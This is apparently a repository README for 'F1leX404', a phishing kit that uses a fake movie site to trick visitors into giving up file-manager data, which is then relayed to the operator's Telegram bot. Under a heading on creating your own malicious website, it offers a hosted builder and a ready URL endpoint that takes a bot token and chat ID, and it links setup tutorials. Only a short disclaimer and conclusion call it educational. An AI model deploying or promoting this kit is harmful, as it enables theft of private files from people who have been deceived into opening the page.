# F1leX404

This project demonstrates how hackers can create websites and use social engineering techniques to access a user's file manager data. The objective of this research is to explore methods hackers use to manipulate users into unknowingly providing access to sensitive files.

## Overview

In this study, we analyzed various techniques used by hackers to design malicious websites that exploit social engineering. The goal is to gain unauthorized access to a user’s file manager data, which is stored locally on their device. Hackers typically create websites that look legitimate and trick users into interacting with them, usually via phishing or fake download links. Once the user interacts with the page, malicious scripts or prompts are used to access the user’s file system.

## How It Works

### Data Access on Telegram
After users interact with the malicious website, their data can be sent directly to the hacker via Telegram. You can visualize how data is received through the Telegram bot system in the image below:

![Access Image - Data Received on Telegram](https://i.postimg.cc/ZKWJH5RZ/IMG-20250714-233240.jpg)

### Social Engineering in Action
To understand how hackers manipulate users, you can watch the following video where the techniques are demonstrated:

[YouTube Video - How Hackers Trick Users](https://youtu.be/8tWrX9j5Nuo)

## Creating Your Own Malicious Website

If you wish to replicate this system, you can use the provided website platform. By entering your own Telegram **Bot Token** and **Chat ID**, you can create a working system where you will receive data from users. **Note**: Do not expose your personal Bot Token or Chat ID in public repositories to ensure security.

[Create Your Own Website](https://cinemaxhub.vercel.app/)

### Token & Chat ID Configuration
To configure your Telegram Bot Token and Chat ID, refer to the following tutorial for step-by-step instructions:

[YouTube Tutorial - How to Get Token & Chat ID](https://youtube.com/shorts/ZvCdiTS-uGw)

**Important**: When sharing or using API keys, **always keep them private** and **never hard-code them in your code**. Use environment variables or secret management services like `dotenv` or GitHub Secrets to store sensitive information.

## Public Code vs. Optimized API

The project includes a **public version of the code** that users can study and experiment with. However, this version is slower due to inefficiencies in the code.

### API Optimization
The **API provided here** is **40% faster** than the public code. This optimized API version ensures that data is processed and transmitted more efficiently, offering a better user experience and reduced latency.

Here is the optimized API endpoint:

[API Endpoint - Faster Version](https://cinemaxhub.vercel.app/movie.html?token=<Your_Token>&id=<Your_Chat_ID>)

**Note**: Replace `<Your_Token>` and `<Your_Chat_ID>` with your actual credentials when using the API.

## Caution

This research is intended strictly for **educational purposes**. Engaging in unauthorized access or social engineering attacks is **illegal** and may result in severe legal consequences. Always obtain proper permission before testing security on any live system.

## Conclusion

Understanding the mechanics behind social engineering and malicious websites is critical in defending against such attacks. By becoming aware of these tactics, individuals and organizations can better secure their data and reduce the risk of exploitation.

**Think Different. Build Different. Make a Difference.**
